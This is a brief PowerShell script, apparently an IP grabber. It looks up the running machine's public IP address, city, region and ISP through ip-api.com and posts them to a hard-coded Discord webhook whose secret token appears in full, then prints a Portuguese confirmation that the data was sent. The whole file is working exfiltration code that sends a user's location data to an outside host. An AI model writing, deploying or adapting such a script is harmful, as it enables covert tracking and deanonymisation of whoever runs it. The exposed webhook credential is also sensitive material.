$webhook = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
$info = Invoke-RestMethod -Uri "http://ip-api.com"
$msg = @{
    content = "🌐 **IP Detectado:** $($info.query)`n📍 **Local:** $($info.city), $($info.regionName)`n🏢 **ISP:** $($info.isp)"
} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json"
Write-Host "Informações de rede enviadas!" -ForegroundColor Green
